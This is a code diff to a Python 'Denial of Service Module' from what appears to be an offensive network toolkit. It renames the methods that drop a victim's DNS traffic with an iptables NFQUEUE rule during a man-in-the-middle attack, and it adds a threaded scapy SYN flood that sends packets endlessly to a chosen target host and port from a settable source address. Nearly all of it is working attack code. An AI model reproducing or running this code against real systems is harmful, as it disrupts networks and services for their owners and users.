@@ -29,13 +29,13 @@ class Jam(object):
 
 	name = "Denial of Service Module."
 	desc = "Denial of service attacks here."
-	version = "0.1"
+	version = "0.4"
 	ps = "Need to add more DoS attacks."
 
 	def __init__(self):
 		self.blocks = []
-
-	def mitmdropstart(self,host):
+		self.stop = False
+	def dnsdropstart(self,host):
 		os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
                 self.host = host
 		try:
@@ -46,10 +46,37 @@ class Jam(object):
 		except Exception as e:
 			print "[!] Exception caught: {}".format(e)
 
-	def mitmdropstop(self):
+	def dnsdropstop(self):
 		os.system('iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 		print "[-] Man-in-the-middle DNS drop finalized."
 
+	def synfloodstart(self, host, tgt, dport):
+		self.src = host
+		self.tgt = tgt
+		self.dport = dport
+		try:
+			print "[+] Syn flood denial of service initialized."
+			self.s = threading.Thread(name='synflood', target=self.synflood)
+			self.s.setDaemon(True)
+			self.s.start()
+		except Exception as e:
+			print "[!] Exception caught: {}".format(e)
+
+	def synfloodstop(self):
+		self.stop = True
+		print "[-] Syn flood denial of service finalized."
+
+	def synflood(self):
+		if self.stop == True:
+			pass
+		else:
+			try:
+				IP_layer = IP(src=self.src, dst=self.tgt)
+				TCP_layer = TCP(sport=1337,dport=self.dport)
+				pkt = IP_layer/TCP_layer
+				send(pkt, loop=1, inter=0.0, verbose=False)
+			except:
+				print "[!] Error: check the parameters (target,interface,port)"
 
 	def callback(self, packet):
                 packet.drop()
